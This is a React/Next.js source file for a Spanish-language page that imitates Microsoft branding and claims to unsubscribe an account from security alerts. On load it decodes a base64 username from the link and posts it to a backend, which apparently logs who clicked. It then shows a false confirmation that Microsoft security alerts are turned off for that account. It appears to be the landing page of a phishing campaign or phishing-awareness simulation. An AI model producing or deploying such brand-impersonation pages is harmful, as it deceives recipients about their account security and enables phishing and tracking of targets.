'use client';

import { useState, useEffect } from 'react';
import styles from './page.module.css';

export default function UnsubscribePage() {
  const [username, setUsername] = useState<string | null>(null);
  const [done, setDone] = useState(false);

  useEffect(() => {
    const raw = new URLSearchParams(window.location.search).get('username');
    const user = raw ? atob(raw) : null;
    setUsername(user);

    fetch('/api/unsubscribe', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: user }),
    })
      .catch((err) => console.error('Error de conexión:', err.message))
      .finally(() => setDone(true));
  }, []);

  return (
    <div className={styles.root}>
      <div className={styles.card}>
        <div className={styles['ms-logo']}>
          <div className={styles.grid}>
            <span></span><span></span>
            <span></span><span></span>
          </div>
          <span className={styles.brand}>Microsoft</span>
        </div>

        {!done ? (
          <div>
            <h1>Cancelar suscripción</h1>
            <p className={styles.subtitle}>Procesando tu solicitud...</p>
          </div>
        ) : (
          <div>
            <p className={styles['confirm-title']}>Suscripción cancelada</p>
            <p className={styles['confirm-text']}>
              Hemos eliminado la siguiente dirección de nuestra lista de notificaciones de seguridad:
            </p>
            <p className={styles['confirm-account']}>{username}</p>
            <p className={styles['confirm-text']} style={{ marginBottom: '28px' }}>
              Ya no recibirás alertas de seguridad de Microsoft para esta cuenta. Si deseas volver a
              activarlas, puedes hacerlo desde la configuración de seguridad de tu cuenta.
            </p>
            <div className={styles.actions}>
              <a
                href="https://outlook.office365.com"
                className={`${styles.btn} ${styles['btn-primary']}`}
              >
                Ir a mi cuenta
              </a>
            </div>
          </div>
        )}
      </div>

      <div className={styles.footer}>
        <a href="#">Términos de uso</a>
        <a href="#">Privacidad y cookies</a>
      </div>
    </div>
  );
}
